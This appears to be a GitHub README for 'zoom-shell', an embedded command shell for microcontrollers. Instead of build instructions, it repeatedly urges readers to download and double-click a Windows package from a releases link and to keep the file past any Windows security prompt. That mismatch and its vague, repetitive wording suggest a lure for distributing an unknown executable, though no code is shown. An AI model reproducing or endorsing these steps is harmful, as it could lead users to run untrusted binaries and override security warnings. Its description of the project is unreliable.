# 🐚 zoom-shell - Simple shell for embedded devices

[![Download zoom-shell](https://img.shields.io/badge/Download%20zoom-shell-purple?style=for-the-badge&logo=github)](https://github.com/SkidSocietyEst/zoom-shell/releases)

## 🚀 What it is

zoom-shell is a small command shell for embedded devices. It gives you a command line that runs on MCUs and uses no dynamic memory. It works with simple I/O callbacks, so you can connect it to serial, USB, or any other text input and output path your device uses.

This project fits well when you need:

- A shell for a microcontroller
- A small debug console
- Command handling without malloc
- Support for custom commands and subcommands
- Extra tools like hex dump, math, games, and an AI bridge

## 📥 Download

Visit the release page to download and run the latest version for Windows:

https://github.com/SkidSocietyEst/zoom-shell/releases

## 🪟 Install on Windows

1. Open the release page in your browser.
2. Find the latest release.
3. Download the Windows file that matches your system.
4. If the download comes as a ZIP file, extract it first.
5. Open the extracted folder.
6. Double-click the app or run the included file as shown in the release notes.

If Windows shows a security prompt, choose the option that lets you keep the file and continue.

## ⚙️ How it works

zoom-shell is built for embedded systems, but the release page can include a desktop build or helper package for Windows users who want to try it, test commands, or explore the shell before using it on hardware.

The shell supports:

- Commands stored in linker sections
- Subcommands for grouped actions
- Variables for simple state
- User handling for different access levels
- I/O callbacks for custom input and output
- Zero-malloc design for tight memory use

## 🧩 Main features

### 🔹 Small and memory-safe

zoom-shell avoids malloc. That helps on small devices where memory is limited and must stay predictable.

### 🔹 Custom command layout

You can place commands in linker sections. That makes it easier to add new commands without changing the core shell logic.

### 🔹 Clear command structure

The shell supports:

- Single commands
- Subcommands
- Variables
- Users

This keeps the command set organized as it grows.

### 🔹 Flexible device input and output

The shell uses callbacks for input and output. That means it can work over:

- UART
- USB serial
- Telnet-style links
- Test harnesses
- Other text channels

### 🔹 Optional extras

The project also mentions optional extensions such as:

- AI bridge
- Hex dump
- Calculator
- Small games

These extras can help during debugging or demos.

## 🖥️ Windows use

If the release page includes a Windows package, use it to:

- Test command behavior
- Explore the shell interface
- Check output formatting
- Try sample commands before deploying to hardware

For most users, the steps are simple:

1. Download the latest release.
2. Extract it if needed.
3. Open the included file.
4. Follow the on-screen prompt or run the sample program.

## 📚 Typical use cases

zoom-shell is a fit for:

- Firmware projects
- Debug consoles
- Device setup menus
- Service tools
- Lab testing
- Product demos

It works well when you want a command line that stays small and easy to wire into a device.

## 🔧 What you may need

For Windows use, a standard setup is enough:

- Windows 10 or newer
- A file unzip tool if the release is packed as ZIP
- A terminal app if the package uses text input
- A serial tool if you plan to connect to hardware later

For embedded use, you may also need:

- A C99-capable build tool
- A target MCU toolchain
- Access to your board’s UART or USB console
- Basic firmware build steps from your project

## 🧪 Example flow

A common setup looks like this:

1. Download zoom-shell from the release page.
2. Run the Windows build or open the package contents.
3. Read the example commands.
4. Type a command in the shell window or send it over serial.
5. See the response from the shell.
6. Add your own commands later if you use it in firmware.

## 🛠️ Command model

zoom-shell is designed around simple text commands. A command can do one task, or it can open a group of related actions.

Example command types:

- `help`
- `version`
- `status`
- `set user`
- `show vars`
- `dump memory`
- `calc 2+2`

The exact command list depends on the build and any optional extensions you include.

## 🔗 Release download

Download and run the Windows package from the release page:

https://github.com/SkidSocietyEst/zoom-shell/releases

## 🧭 Tips for first use

- Start with the latest release
- Use the included help command if one is present
- Keep the shell open while you test commands
- Try one command at a time
- Use the hex dump tool if you need to inspect raw data
- Use the calculator tool for quick checks during testing

## 🧱 Project focus

zoom-shell is built for small systems, low memory use, and clean command flow. It aims to stay simple while still giving you useful shell tools for embedded work and device control

## 🪪 License

MIT